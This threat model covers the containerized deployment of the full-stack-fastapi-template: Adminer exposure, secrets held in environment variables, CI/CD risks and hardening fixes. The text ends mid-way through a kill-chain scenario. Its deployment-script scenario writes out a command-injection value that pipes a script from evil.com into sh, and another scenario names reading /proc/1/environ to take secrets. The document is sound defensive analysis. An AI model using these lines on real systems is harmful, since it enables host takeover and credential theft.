# Infrastructure and Deployment Threat Model

## 1. Executive Summary

This threat model analyzes security risks in the containerized deployment architecture of the full-stack-fastapi-template application. The analysis covers container security, CI/CD pipeline vulnerabilities, network attack surfaces, and supply chain threats. The deployment architecture uses Docker Compose with Traefik reverse proxy, PostgreSQL database, and GitHub Actions for continuous deployment.

**Critical Risk Areas:**
- Exposed database management interface (Adminer) without authentication controls
- Secrets management through environment variables with exposure risks
- Container privilege escalation opportunities
- Supply chain vulnerabilities in base images and dependencies
- CI/CD pipeline secret exposure in GitHub Actions
- Network lateral movement between containers

## 2. Infrastructure Architecture Overview

### 2.1 Deployment Components

**Reference:** `docker-compose.yml`

The infrastructure consists of five containerized services:

1. **Database Service (`db`)**
   - Image: `postgres:17`
   - Persistent volume: `app-db-data:/var/lib/postgresql/data/pgdata`
   - Network: default (internal)
   - Health check: `pg_isready -U ${POSTGRES_USER} -d ${POSTGRES_DB}`

2. **Database Admin Interface (`adminer`)**
   - Image: `adminer` (official image)
   - Networks: `traefik-public` (exposed), `default` (internal)
   - Exposed via: `adminer.${DOMAIN}`
   - Port: 8080 (internal)

3. **Backend Pre-start Service (`prestart`)**
   - Image: Custom-built from `./backend`
   - Command: `bash scripts/prestart.sh`
   - Dependency: Database health check must pass
   - Network: `traefik-public`, `default`

4. **Backend API Service (`backend`)**
   - Image: Custom-built from `./backend`
   - Exposed via: `api.${DOMAIN}`
   - Port: 8000 (internal)
   - Health check: `curl -f http://localhost:8000/api/v1/utils/health-check/`
   - Networks: `traefik-public`, `default`

5. **Frontend Service (`frontend`)**
   - Image: Custom-built from `./frontend`
   - Exposed via: `dashboard.${DOMAIN}`
   - Port: 80 (internal)
   - Build args: `VITE_API_URL=https://api.${DOMAIN}`, `NODE_ENV=production`
   - Networks: `traefik-public`, `default`

### 2.2 Network Topology

**Networks:**
- `traefik-public`: External network for Traefik proxy (marked as external: true)
- `default`: Internal network for service communication

**Attack Surface Exposure:**
- External: `adminer.${DOMAIN}`, `api.${DOMAIN}`, `dashboard.${DOMAIN}`
- Internal: Database on port 5432, inter-service communication

## 3. Container Security Threats

### 3.1 Image Vulnerabilities (HIGH SEVERITY)

**Threat:** Use of third-party base images without version pinning or vulnerability scanning.

**Attack Vectors:**
- `postgres:17` - Major version only, no specific patch version
- `adminer` - No version specified, uses latest tag implicitly
- Custom builds may inherit vulnerabilities from base layers

**Evidence from Configuration:**
```yaml
db:
  image: postgres:17  # No patch version specified

adminer:
  image: adminer  # No version tag at all
```

**Impact:**
- Known CVEs in PostgreSQL or Adminer could be present
- Automatic pulling of images may introduce new vulnerabilities
- No rollback mechanism for image updates

**Exploitation Scenario:**
1. Attacker identifies CVE in adminer latest image
2. Exploits vulnerability through `adminer.${DOMAIN}` endpoint
3. Gains access to database credentials and data

### 3.2 Container Privilege Escalation (HIGH SEVERITY)

**Threat:** Containers running without user namespace isolation or security profiles.

**Evidence from Configuration:**
No security restrictions defined in `docker-compose.yml`:
- No `user:` directives (all containers run as root)
- No `security_opt:` configurations
- No `cap_drop:` or `cap_add:` restrictions
- No `read_only:` filesystem constraints

**Attack Vectors:**
```yaml
backend:
  image: '${DOCKER_IMAGE_BACKEND}'
  # Missing security controls:
  # user: "1000:1000"
  # security_opt:
  #   - no-new-privileges:true
  # cap_drop:
  #   - ALL
```

**Impact:**
- Compromised container can escalate to root within container
- Kernel exploits could enable container escape
- Write access to entire container filesystem

**Exploitation Scenario:**
1. Attacker exploits application vulnerability in backend service
2. Gains shell access as root inside container
3. Exploits kernel vulnerability (CVE-2022-0847 "Dirty Pipe")
4. Escapes container to host system

### 3.3 Container Escape via Volume Mounts (MEDIUM SEVERITY)

**Threat:** Persistent volume for database data could be manipulated for privilege escalation.

**Evidence from Configuration:**
```yaml
db:
  volumes:
    - app-db-data:/var/lib/postgresql/data/pgdata
```

**Attack Vectors:**
- Volume mounted with full read/write access
- No AppArmor or SELinux profiles to restrict file access
- Database compromise could lead to malicious file placement in volume

**Impact:**
- Persistence across container restarts
- Potential for backdoor installation
- Data exfiltration via volume manipulation

### 3.4 Insecure Container Restart Policies (LOW SEVERITY)

**Threat:** `restart: always` policy can mask exploitation and enable persistent attacks.

**Evidence from Configuration:**
```yaml
db:
  restart: always

backend:
  restart: always

frontend:
  restart: always

adminer:
  restart: always
```

**Impact:**
- Crashed containers from attacks automatically restart
- Logging of crash events may be insufficient
- Attackers gain persistence through automatic recovery

## 4. Supply Chain Threats

### 4.1 Base Image Supply Chain (HIGH SEVERITY)

**Threat:** Compromised or malicious base images from Docker Hub.

**Evidence from Configuration:**
- `postgres:17` - Official image but no digest verification
- `adminer` - Official image but no version control
- Custom images inherit trust from base layers

**Attack Vectors:**
```yaml
# No image digest verification:
# Should be: image: postgres:17@sha256:abc123...
image: postgres:17
```

**Impact:**
- Supply chain attack via compromised official images
- Man-in-the-middle during image pull
- Malicious code execution from infected base layers

**Mitigation Gap:** No Content Trust or image signature verification configured.

### 4.2 Build-Time Dependency Injection (HIGH SEVERITY)

**Threat:** Malicious dependencies installed during Docker build process.

**Evidence from Configuration:**
```yaml
backend:
  build:
    context: ./backend

frontend:
  build:
    context: ./frontend
    args:
      - VITE_API_URL=https://api.${DOMAIN}
      - NODE_ENV=production
```

**Attack Vectors:**
- Python packages from PyPI during backend build
- NPM packages during frontend build
- No dependency verification or SBOM generation
- Build-time secrets potentially exposed in layers

**Impact:**
- Malicious code injection through compromised packages
- Supply chain attacks via typosquatting
- Backdoor installation in production images

### 4.3 Third-Party Dependency Vulnerabilities (MEDIUM SEVERITY)

**Threat:** Known vulnerabilities in application dependencies not scanned or patched.

**Attack Vectors:**
- No vulnerability scanning in build pipeline
- No SBOM (Software Bill of Materials) generation
- Dependencies not pinned to specific versions

**Impact:**
- Exploitation of known CVEs in dependencies
- Compliance violations (lack of SBOM)
- Difficulty in vulnerability response

## 5. Network Security Threats

### 5.1 Traefik Proxy Man-in-the-Middle (HIGH SEVERITY)

**Threat:** TLS termination at Traefik with potential certificate compromise or misconfiguration.

**Evidence from Configuration:**
```yaml
labels:
  - traefik.http.routers.${STACK_NAME}-backend-https.tls=true
  - traefik.http.routers.${STACK_NAME}-backend-https.tls.certresolver=le
  - traefik.http.routers.${STACK_NAME}-backend-http.middlewares=https-redirect
```

**Attack Vectors:**
- Let's Encrypt certificate private keys stored on host
- HTTP to HTTPS redirect can be bypassed if middleware fails
- No HSTS (HTTP Strict Transport Security) headers visible
- No certificate pinning for client connections

**Impact:**
- TLS interception if Traefik host compromised
- Downgrade attacks to HTTP if redirect fails
- Certificate theft enabling persistent MITM

**Exploitation Scenario:**
1. Attacker compromises host running Traefik
2. Steals Let's Encrypt private keys from Traefik configuration
3. Performs MITM on all `*.${DOMAIN}` traffic

### 5.2 Internal Network Lateral Movement (HIGH SEVERITY)

**Threat:** Flat network architecture enables lateral movement between compromised containers.

**Evidence from Configuration:**
```yaml
networks:
  traefik-public:
    external: true
  default:
    # No network isolation or segmentation
```

**Attack Vectors:**
- All backend services on same `default` network
- No network policies restricting container-to-container communication
- Database accessible from all containers on default network
- Adminer has access to both networks (dual-homed)

**Impact:**
- Compromised frontend can attack backend
- Compromised backend can directly access database
- Adminer compromise provides pivot point between networks

**Network Attack Path:**
```
Internet → Traefik → Frontend (compromised)
                  → Backend (lateral movement)
                  → Database (data exfiltration)
```

### 5.3 Exposed Database Management Interface (CRITICAL SEVERITY)

**Threat:** Adminer interface exposed to internet without additional authentication.

**Evidence from Configuration:**
```yaml
adminer:
  image: adminer
  networks:
    - traefik-public  # Publicly accessible
    - default
  labels:
    - traefik.http.routers.${STACK_NAME}-adminer-https.rule=Host(`adminer.${DOMAIN}`)
    - traefik.http.routers.${STACK_NAME}-adminer-https.entrypoints=https
```

**Attack Vectors:**
- Direct access via `adminer.${DOMAIN}` from internet
- No IP whitelisting or VPN requirement
- No additional authentication layer before Adminer login
- Brute force attacks on database credentials
- Exploitation of Adminer vulnerabilities (CVEs)

**Impact:**
- Direct database access if credentials compromised
- Data exfiltration of all application data
- Data manipulation or destruction
- Privilege escalation to backend systems

**Exploitation Scenario:**
1. Attacker discovers `adminer.${DOMAIN}` endpoint
2. Brute forces `POSTGRES_USER` and `POSTGRES_PASSWORD`
3. Gains full database access
4. Exfiltrates user data, API keys, session tokens
5. Modifies user roles for privilege escalation

### 5.4 Missing Network Security Controls (MEDIUM SEVERITY)

**Threat:** No network-level security hardening implemented.

**Missing Controls:**
- No network policies (Kubernetes NetworkPolicy equivalent)
- No firewall rules between containers
- No rate limiting at network layer
- No DDoS protection
- No WAF (Web Application Firewall) integration

**Impact:**
- Unrestricted network communication
- Vulnerability to network-based attacks
- No defense against DDoS

## 6. CI/CD Pipeline Threats

### 6.1 GitHub Actions Secret Exposure (CRITICAL SEVERITY)

**Threat:** Deployment credentials and secrets exposed through GitHub Actions workflows.

**Evidence from Workflow Files:**
`.github/workflows/deploy-production.yml` - Exists but content not provided
`.github/workflows/deploy-staging.yml` - Exists but content not provided

**Attack Vectors:**
- Secrets stored as GitHub repository secrets
- Potential logging of secret values in workflow runs
- Pull request workflows may expose secrets if not protected
- Forked repositories could expose secrets if workflow permissions misconfigured

**Likely Secrets Requiring Protection:**
- `POSTGRES_PASSWORD`
- `SECRET_KEY` (application secret)
- `FIRST_SUPERUSER_PASSWORD`
- `SMTP_PASSWORD`
- Docker registry credentials
- SSH deployment keys

**Impact:**
- Full infrastructure compromise if deployment credentials leaked
- Database access if `POSTGRES_PASSWORD` exposed
- User account compromise if `SECRET_KEY` exposed
- Email system abuse if `SMTP_PASSWORD` exposed

**Exploitation Scenario:**
1. Attacker submits malicious PR with workflow that logs secrets
2. GitHub Actions runs workflow with secrets available
3. Secrets logged to workflow output or sent to attacker-controlled endpoint
4. Attacker uses credentials to compromise production infrastructure

### 6.2 Deployment Script Security (HIGH SEVERITY)

**Threat:** Deployment script executes with insufficient validation and error handling.

**Evidence from Configuration:**
`scripts/deploy.sh`:
```bash
#!/usr/bin/env sh
set -e

DOMAIN=${DOMAIN?Variable not set} \
STACK_NAME=${STACK_NAME?Variable not set} \
TAG=${TAG?Variable not set} \
docker-compose \
-f docker-compose.yml \
config > docker-stack.yml

docker-auto-labels docker-stack.yml

docker stack deploy -c docker-stack.yml --with-registry-auth "${STACK_NAME}"
```

**Attack Vectors:**
- No validation of `DOMAIN`, `STACK_NAME`, or `TAG` values
- Command injection via unsanitized environment variables
- Generated `docker-stack.yml` not validated before deployment
- `docker-auto-labels` command execution without verification
- `--with-registry-auth` passes credentials to all nodes

**Impact:**
- Command injection during deployment
- Deployment of malicious configuration
- Registry credential exposure
- Privilege escalation on deployment host

**Exploitation Scenario:**
1. Attacker compromises GitHub Actions workflow
2. Injects malicious value into `TAG` variable: `latest; curl http://evil.com/shell.sh | sh`
3. Deployment script executes injected command
4. Attacker gains shell on deployment host

### 6.3 Container Image Build Poisoning (HIGH SEVERITY)

**Threat:** Malicious code injection during automated image builds in CI/CD.

**Evidence from Configuration:**
```yaml
backend:
  image: '${DOCKER_IMAGE_BACKEND}:${TAG-latest}'
  build:
    context: ./backend

frontend:
  image: '${DOCKER_IMAGE_FRONTEND}:${TAG-latest}'
  build:
    context: ./frontend
```

**Attack Vectors:**
- Workflow files: `.github/workflows/test-docker-compose.yml`, `.github/workflows/playwright.yml`
- Build context includes entire backend/frontend directories
- No `.dockerignore` validation
- Build-time secrets may be embedded in layers
- No image scanning before push to registry

**Impact:**
- Malicious code in production images
- Backdoor installation
- Secret leakage in image layers
- Supply chain compromise

### 6.4 Workflow Injection Attacks (MEDIUM SEVERITY)

**Threat:** Untrusted input in GitHub Actions workflows leading to code execution.

**Evidence from Workflow Files:**
- `.github/workflows/generate-client.yml` - Client code generation
- `.github/workflows/latest-changes.yml` - Changelog generation
- `.github/workflows/labeler.yml` - PR labeling

**Attack Vectors:**
- Pull request titles/descriptions used in workflows
- Branch names used in conditional logic
- Issue content processed by workflows
- Untrusted script execution

**Impact:**
- Arbitrary code execution in GitHub Actions runners
- Secret exfiltration
- Repository manipulation
- Supply chain compromise

## 7. Secrets Management Threats

### 7.1 Environment Variable Secret Exposure (CRITICAL SEVERITY)

**Threat:** Sensitive credentials passed as environment variables with multiple exposure vectors.

**Evidence from Configuration:**
```yaml
backend:
  env_file:
    - .env
  environment:
    - SECRET_KEY=${SECRET_KEY?Variable not set}
    - FIRST_SUPERUSER_PASSWORD=${FIRST_SUPERUSER_PASSWORD?Variable not set}
    - SMTP_PASSWORD=${SMTP_PASSWORD}
    - POSTGRES_PASSWORD=${POSTGRES_PASSWORD?Variable not set}
```

**Attack Vectors:**
1. **Process Exposure:** Environment variables visible in `/proc/[pid]/environ`
2. **Container Inspection:** `docker inspect` reveals all environment variables
3. **Error Messages:** Stack traces may expose environment variable values
4. **Log Files:** Application logging may inadvertently log secrets
5. **Child Processes:** Secrets inherited by all child processes
6. **Core Dumps:** Secrets may appear in crash dumps

**Impact:**
- Database compromise via `POSTGRES_PASSWORD`
- Application compromise via `SECRET_KEY` (JWT signing, encryption)
- Admin account takeover via `FIRST_SUPERUSER_PASSWORD`
- Email system compromise via `SMTP_PASSWORD`

**Exploitation Scenario:**
1. Attacker gains read access to container (CVE exploit or misconfiguration)
2. Executes `cat /proc/1/environ` or `docker inspect <container>`
3. Extracts all secrets including database password
4. Connects directly to database via exposed port or network access
5. Exfiltrates all application data

### 7.2 Secret Persistence in Configuration Files (HIGH SEVERITY)

**Threat:** `.env` file contains secrets in plaintext and may be accidentally committed or exposed.

**Evidence from Configuration:**
```yaml
db:
  env_file:
    - .env

prestart:
  env_file:
    - .env

backend:
  env_file:
    - .env
```

**Attack Vectors:**
- `.env` file accidentally committed to git repository
- `.env` file readable by other users on host (insufficient permissions)
- `.env` file included in backups without encryption
- `.env` file exposed via misconfigured web server
- `.env` file visible in Docker build context

**Impact:**
- Permanent secret exposure in git history
- Secret leakage through backup systems
- Multi-container exposure (same .env used by all services)

### 7.3 Required vs. Optional Secrets (MEDIUM SEVERITY)

**Threat:** Inconsistent secret validation allows optional secrets to be empty, potentially disabling security features.

**Evidence from Configuration:**
```yaml
environment:
  - SECRET_KEY=${SECRET_KEY?Variable not set}  # Required
  - POSTGRES_PASSWORD=${POSTGRES_PASSWORD?Variable not set}  # Required
  - SMTP_PASSWORD=${SMTP_PASSWORD}  # Optional - no validation
  - SENTRY_DSN=${SENTRY_DSN}  # Optional - no validation
```

**Attack Vectors:**
- Optional `SMTP_PASSWORD` may lead to unauthenticated SMTP usage
- Missing `SENTRY_DSN` disables error tracking, hiding attacks
- Inconsistent validation makes security requirements unclear

**Impact:**
- Degraded security posture from missing optional secrets
- Reduced visibility into attacks if monitoring disabled
- Potential for email injection if SMTP not secured

## 8. Data Persistence and Storage Threats

### 8.1 Unencrypted Data at Rest (HIGH SEVERITY)

**Threat:** Database volume stores sensitive data without encryption.

**Evidence from Configuration:**
```yaml
volumes:
  app-db-data:
    # No encryption configuration
```

**Attack Vectors:**
- Direct access to volume on host filesystem
- Volume backup without encryption
- Volume mount in unauthorized container
- Host compromise exposes all database files

**Impact:**
- Data breach if host compromised
- Compliance violations (GDPR, HIPAA, PCI-DSS)
- Exposure of user passwords, PII, business data

**Volume Location:** Typically `/var/lib/docker/volumes/app-db-data/_data`

### 8.2 Database Backup Security (MEDIUM SEVERITY)

**Threat:** No automated backup mechanism with potential for data loss or insecure manual backups.

**Evidence from Configuration:**
No backup service or volume defined in `docker-compose.yml`

**Attack Vectors:**
- Manual backups stored in insecure locations
- Backup files containing plaintext credentials
- No backup encryption or access controls
- Backups copied to insecure endpoints

**Impact:**
- Data loss in disaster scenarios
- Backup files as attack vector
- Compliance violations

## 9. Production Deployment Threats

### 9.1 Single Stack Deployment Model (MEDIUM SEVERITY)

**Threat:** Single Docker Stack deployment lacks redundancy and isolation.

**Evidence from Configuration:**
`scripts/deploy.sh`:
```bash
docker stack deploy -c docker-stack.yml --with-registry-auth "${STACK_NAME}"
```

**Attack Vectors:**
- Single point of failure (no high availability)
- All services on same Docker host
- No blue-green deployment for zero-downtime
- No rollback mechanism on deployment failure

**Impact:**
- Service downtime during attacks or failures
- Entire application compromised if host compromised
- Difficult recovery from deployment errors

### 9.2 Registry Authentication Propagation (HIGH SEVERITY)

**Threat:** `--with-registry-auth` flag propagates registry credentials to all Docker Swarm nodes.

**Evidence from Configuration:**
```bash
docker stack deploy -c docker-stack.yml --with-registry-auth "${STACK_NAME}"
```

**Attack Vectors:**
- Registry credentials available on all Swarm worker nodes
- Compromised worker node exposes registry access
- Lateral movement using registry credentials
- Unauthorized image pulls or pushes

**Impact:**
- Container registry compromise
- Supply chain attack via malicious image injection
- Lateral movement across infrastructure

### 9.3 Environment-Specific Configuration (MEDIUM SEVERITY)

**Threat:** Single configuration file used across environments with variable substitution.

**Evidence from Configuration:**
```yaml
environment:
  - ENVIRONMENT=${ENVIRONMENT}
  - DOMAIN=${DOMAIN}
```

**Attack Vectors:**
- Production credentials used in staging if variables not overridden
- Development settings accidentally deployed to production
- Cross-environment credential leakage

**Impact:**
- Production data accessible from staging
- Weakened security controls in production
- Regulatory compliance violations

## 10. Health Check and Monitoring Threats

### 10.1 Health Check Information Disclosure (LOW SEVERITY)

**Threat:** Health check endpoints may expose sensitive information.

**Evidence from Configuration:**
```yaml
backend:
  healthcheck:
    test: ["CMD", "curl", "-f", "http://localhost:8000/api/v1/utils/health-check/"]

db:
  healthcheck:
    test: ["CMD-SHELL", "pg_isready -U ${POSTGRES_USER} -d ${POSTGRES_DB}"]
```

**Attack Vectors:**
- Health check endpoints accessible without authentication
- Error messages expose internal configuration
- Database connection details revealed in pg_isready output
- Response timing attacks to enumerate services

**Impact:**
- Information gathering for targeted attacks
- Service enumeration
- Internal architecture disclosure

### 10.2 Missing Monitoring and Alerting (MEDIUM SEVERITY)

**Threat:** Limited observability into security events and attacks.

**Evidence from Configuration:**
```yaml
environment:
  - SENTRY_DSN=${SENTRY_DSN}  # Optional error tracking
```

**Missing Security Controls:**
- No security event logging service
- No intrusion detection system (IDS)
- No file integrity monitoring
- No anomaly detection
- Optional Sentry may not be configured

**Impact:**
- Delayed detection of security breaches
- Insufficient forensic data for incident response
- Compliance violations (audit log requirements)

## 11. Risk Assessment Matrix

| Threat Category | Severity | Likelihood | Impact | Priority |
|----------------|----------|------------|--------|----------|
| Exposed Adminer Interface | Critical | High | Critical | P0 |
| Secret Exposure (Environment Variables) | Critical | High | Critical | P0 |
| GitHub Actions Secret Leakage | Critical | Medium | Critical | P0 |
| Container Privilege Escalation | High | Medium | Critical | P1 |
| Traefik MITM | High | Medium | High | P1 |
| Internal Network Lateral Movement | High | High | High | P1 |
| Base Image Supply Chain | High | Medium | High | P1 |
| Unencrypted Data at Rest | High | Medium | High | P1 |
| Deployment Script Injection | High | Low | Critical | P2 |
| Build-Time Dependency Injection | High | Medium | High | P2 |
| Registry Auth Propagation | High | Low | High | P2 |
| Container Escape via Volumes | Medium | Low | High | P3 |
| Missing Network Security Controls | Medium | High | Medium | P3 |
| Missing Monitoring | Medium | High | Medium | P3 |

## 12. Remediation Recommendations

### 12.1 Critical Priority (P0)

**1. Secure Adminer Access**
- Remove Adminer from production or restrict to VPN/IP whitelist
- Implement additional authentication layer (OAuth2, BasicAuth)
- Use read-only database user for Adminer
- Add rate limiting on Adminer endpoint

**Implementation:**
```yaml
adminer:
  labels:
    - traefik.http.routers.${STACK_NAME}-adminer-https.middlewares=admin-auth
    - traefik.http.middlewares.admin-auth.basicauth.users=${ADMIN_HTPASSWD}
  networks:
    - default  # Remove from traefik-public
```

**2. Implement Secrets Management**
- Replace environment variables with Docker Secrets or Vault
- Use secret rotation mechanisms
- Implement least-privilege access to secrets

**Implementation:**
```yaml
secrets:
  postgres_password:
    external: true
  secret_key:
    external: true

services:
  backend:
    secrets:
      - postgres_password
      - secret_key
```

**3. Secure GitHub Actions Workflows**
- Use environment protection rules for production deployments
- Implement OIDC authentication instead of long-lived credentials
- Add secret scanning with tools like GitGuardian or TruffleHog
- Restrict workflow permissions to minimum required

**Implementation:**
```yaml
# In workflow file
permissions:
  contents: read
  id-token: write  # For OIDC

jobs:
  deploy:
    environment: production
    runs-on: ubuntu-latest
```

### 12.2 High Priority (P1)

**4. Harden Container Security**
```yaml
backend:
  user: "1000:1000"
  security_opt:
    - no-new-privileges:true
  cap_drop:
    - ALL
  cap_add:
    - NET_BIND_SERVICE
  read_only: true
  tmpfs:
    - /tmp
```

**5. Implement Network Segmentation**
```yaml
networks:
  frontend-net:
    internal: false
  backend-net:
    internal: true
  db-net:
    internal: true

services:
  frontend:
    networks:
      - frontend-net
      - backend-net
  backend:
    networks:
      - backend-net
      - db-net
  db:
    networks:
      - db-net
```

**6. Pin Image Versions with Digests**
```yaml
db:
  image: postgres:17.0@sha256:[specific-digest]

adminer:
  image: adminer:4.8.1@sha256:[specific-digest]
```

**7. Enable Data-at-Rest Encryption**
- Use encrypted volumes (LUKS, dm-crypt)
- Enable PostgreSQL TDE (Transparent Data Encryption)
- Encrypt backup files

**8. Implement TLS Best Practices**
```yaml
labels:
  - traefik.http.middlewares.security-headers.headers.stsSeconds=31536000
  - traefik.http.middlewares.security-headers.headers.stsIncludeSubdomains=true
  - traefik.http.middlewares.security-headers.headers.stsPreload=true
  - traefik.http.routers.${STACK_NAME}-backend-https.middlewares=security-headers
```

### 12.3 Medium Priority (P2)

**9. Implement Vulnerability Scanning**
- Add Trivy or Clair to CI/CD pipeline
- Scan images before deployment
- Generate SBOM for compliance

**Implementation:**
```yaml
# In GitHub Actions workflow
- name: Scan Docker image
  uses: aquasecurity/trivy-action@master
  with:
    image-ref: ${{ env.IMAGE_TAG }}
    severity: HIGH,CRITICAL
    exit-code: 1
```

**10. Enhance Deployment Script Security**
```bash
#!/usr/bin/env bash
set -euo pipefail

# Input validation
if [[ ! "${DOMAIN}" =~ ^[a-zA-Z0-9.-]+$ ]]; then
  echo "Invalid DOMAIN" >&2
  exit 1
fi

if [[ ! "${TAG}" =~ ^[a-zA-Z0-9._-]+$ ]]; then
  echo "Invalid TAG" >&2
  exit 1
fi

# Verify generated configuration
docker-compose -f docker-compose.yml config > docker-stack.yml
yamllint docker-stack.yml

# Deploy with validation
docker stack deploy -c docker-stack.yml "${STACK_NAME}"
```

**11. Implement Security Monitoring**
- Deploy Falco for runtime security monitoring
- Implement centralized logging with ELK or Loki
- Configure Sentry with proper DSN
- Add audit logging for all administrative actions

**12. Enable Resource Limits**
```yaml
backend:
  deploy:
    resources:
      limits:
        cpus: '1'
        memory: 512M
      reservations:
        cpus: '0.5'
        memory: 256M
```

### 12.4 Long-Term Strategic Recommendations

1. **Migrate to Kubernetes** for better security primitives (NetworkPolicies, PodSecurityPolicies)
2. **Implement Zero Trust Architecture** with mutual TLS between services
3. **Deploy WAF** (ModSecurity, AWS WAF) in front of Traefik
4. **Implement High Availability** with multi-node cluster and load balancing
5. **Automate Security Testing** with DAST tools (OWASP ZAP) in CI/CD
6. **Establish Incident Response Plan** with defined procedures for breach scenarios
7. **Implement Backup and Disaster Recovery** with automated, encrypted backups
8. **Deploy Container Registry** with vulnerability scanning and image signing

## 13. Compliance and Audit Considerations

### 13.1 Missing Security Controls for Compliance

**PCI-DSS Requirements:**
- No encryption of cardholder data at rest (Requirement 3.4)
- Insufficient access controls on Adminer (Requirement 7)
- No audit trails for database access (Requirement 10)

**GDPR Requirements:**
- No data-at-rest encryption (Article 32)
- Insufficient security monitoring (Article 32)
- No data breach detection mechanisms (Article 33)

**SOC 2 Requirements:**
- No logical access controls documentation
- Missing security monitoring and alerting
- Insufficient change management in CI/CD

### 13.2 SBOM Requirements

No SBOM generation configured for:
- Python dependencies in backend
- NPM dependencies in frontend
- Base container images
- System packages in containers

**Recommended Implementation:** Use Syft or SBOM-tool in CI/CD pipeline to generate CycloneDX or SPDX formatted SBOMs.

## 14. Attack Scenarios and Kill Chain Analysis

### Scenario 1: Full Infrastructure Compromise via Adminer

**Kill Chain:**
1. **Reconnaissance:** Attacker discovers `adminer.${DOMAIN}` via DNS enumeration
2. **Initial Access:** Brute forces `POSTGRES_USER` credentials or exploits Adminer CVE
3. **Execution:** Gains SQL execution capabilities via Adminer
4. **Persistence:** Creates backdoor database user with elevated privileges
5. **Privilege Escalation:** Uses database access to dump `SECRET_KEY` from backend tables
6. **Lateral Movement:** Uses `SECRET_KEY` to forge JWT tokens